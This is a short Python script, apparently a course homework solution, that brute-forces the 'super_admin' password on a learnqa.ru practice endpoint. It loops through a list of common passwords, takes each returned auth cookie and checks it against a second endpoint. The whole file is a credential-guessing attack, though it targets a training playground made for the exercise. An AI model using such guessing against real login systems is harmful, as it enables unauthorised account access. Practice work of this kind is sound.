import requests

possible_passwords = ['123456', '123456789', 'qwerty', 'password', '1234567', '12345678', 'iloveyou',
                      '12345', '111111', '123123', 'abc123', 'qwerty123', '1q2w3e4r', 'admin',
                      'qwertyuiop', '654321', '555555', 'lovely', '7777777', 'welcome', '888888',
                      'princess', 'dragon', 'password1', '123qwe']


for i in range(len(possible_passwords)):
    payload = {"login": "super_admin", "password": possible_passwords[i]}
    response1 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data=payload)

    cookie_value = response1.cookies.get('auth_cookie')

    cookies = {}
    if cookies is not None:
        cookies.update({'auth_cookie': cookie_value})

        response2 = requests.post("https://playground.learnqa.ru/api/check_auth_cookie", cookies=cookies)

        print(f"{possible_passwords[i]}")
        print(response2.text)